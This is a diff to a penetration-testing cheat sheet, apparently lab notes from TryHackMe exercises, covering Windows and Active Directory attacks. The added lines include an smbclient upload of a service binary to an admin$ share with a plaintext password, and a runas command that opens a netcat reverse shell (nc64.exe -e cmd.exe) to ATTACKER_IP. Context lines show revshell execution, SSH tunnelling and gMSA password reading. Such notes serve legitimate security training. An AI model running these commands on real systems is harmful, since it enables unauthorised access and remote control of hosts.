@@ -566,7 +566,6 @@ Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command .\revshell443.exe
 ### GMSAPasswordReader
 ```bash
 .\GMSAPasswordReader.exe --accountname svc_apache$
-
 ```
 
 ### smbserver
@@ -875,6 +874,12 @@ net rpc group addmem "REMOTE ACCESS" "Tracy.White" -U nara-security.com/Tracy.Wh
 ```bash
 ```
 
+### smbclient
+```bash
+smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
+```
+
+
 # SSH
 ## SSH Key
 - See if other users can login as root using ssh key
@@ -907,6 +912,8 @@ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
 # Remote dynamic port forwarding
 ssh -N -R 9998 kali@192.168.118.4
 ```
+
+
 
 # Web Attacks
 ## Checklist
@@ -1104,6 +1111,13 @@ Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Pro
 **Server Operators**
 ```bash
 Users can administer Domain Controllers. They cannot change any administrative group memberships.
+```
+
+# Windows Lateral Movement
+## When we have AD credentials but we don't have a machine we can use that credentials
+- Use runas
+```bash
+runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers "c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
 ```
 
 
